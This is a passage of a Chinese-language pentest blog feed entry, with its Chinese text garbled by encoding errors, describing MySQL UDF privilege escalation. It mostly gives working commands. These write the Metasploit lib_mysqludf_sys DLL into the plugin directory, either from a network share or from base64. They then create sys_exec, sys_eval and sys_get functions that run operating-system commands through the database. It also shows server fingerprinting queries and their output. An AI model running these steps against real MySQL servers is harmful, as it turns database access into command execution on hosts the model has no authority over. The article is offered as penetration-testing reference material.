ç½‘ç»œå…±äº«+16è¿›åˆ¶"></a>0x03 ç½‘ç»œå…±äº«+16è¿›åˆ¶</h4><pre class="line-numbers language-none"><code class="language-none">load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39; into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data);select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x04-base64å†™å…¥"><a href="#0x04-base64å†™å…¥" class="headerlink" title="0x04 base64å†™å…¥"></a>0x04 base64å†™å…¥</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å…ˆè½¬æ¢ä¸ºbase64;select to_base64(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.b64&#39;;&#x2F;&#x2F;å†å†™å…¥:select from_base64(&quot;TVqQAAMAAAAEAAAAA&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;æˆ–è€…å†™å…¥åˆ°å¤§è¡¨é‡Œé¢ï¼Œå†å†™å…¥åˆ°æ–‡ä»¶:select from_base64(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>msfè‡ªå¸¦çš„udfæä¾›çš„å‡ ä¸ªå‡½æ•°ï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯<code>sys_eval</code>å’Œ<code>sys_exec</code>,å®æµ‹<code>sys_exec</code>ä¼šæŠŠmysqlå´©æºƒï¼Œå¯èƒ½åˆ›å»ºçš„æ—¶å€™è¿”å›äº†stringï¼Œå»ºè®®ä½¿ç”¨<code>sys_eval</code>:</p><h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><pre class="line-numbers language-none"><code class="language-none">åˆ›å»ºå‡½æ•°:create function sys_exec returns int soname &#39;udf.dll&#39;;ç¡®å®šæ˜¯å¦æˆåŠŸ:select * from mysql.func where name &#x3D; &#39;sys_exec&#39;;åˆ é™¤å‡½æ•°:drop function sys_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><pre class="line-numbers language-none"><code class="language-none">åˆ›å»ºå‡½æ•°:create function sys_eval returns string soname &#39;udf.dll&#39;;ç¡®å®šæ˜¯å¦æˆåŠŸ:select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;åˆ é™¤:drop function sys_eval;ä½¿ç”¨:select sys_eval(&#39;dir&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><pre class="line-numbers language-none"><code class="language-none">create function sys_get returns string soname &#39;udf.dll&#39;;Drop function sys_get;&#x2F;&#x2F;è·å–ç¯å¢ƒå˜é‡Select sys_get(&#39;longonserver&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[mysql-udf-exploitation]&lt;a href=&quot;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&quot;&gt;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&lt;/a&gt;&lt;br&gt;MSFçš„dll: &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&quot;&gt;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x01-å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#0x01-å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;0x01 å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;/a&gt;0x01 å‡†å¤‡å·¥ä½œ&lt;/h3&gt;&lt;p&gt;å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;select @@version_compile_os, @@version_compile_machine;
show variables like &amp;#39;%compile%&amp;#39;;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç»“æœå¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; @@version_compile_os, @@version_compile_machine&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_os &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64                &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64                    &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; show variables like &lt;span class=&quot;token string&quot;&gt;&#39;%compile%&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Variable_name           &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Value  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_os      &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åœ¨&lt;code&gt;Mysql 5.0.67&lt;/code&gt;ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: &lt;code&gt;select @@plugin_dir;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;æŒ‡å®šç›®å½•:
mysqld.exe â€“plugin-dir&amp;#x3D;C:\\temp\\plugins\\

æŒ‡å®šé…ç½®æ–‡ä»¶:
mysqld.exe --defaults-file&amp;#x3D;C:\\temp\\my.ini

é…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:
[mysqld]
plugin_dir &amp;#x3D; C:\\temp\\plugins\\&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
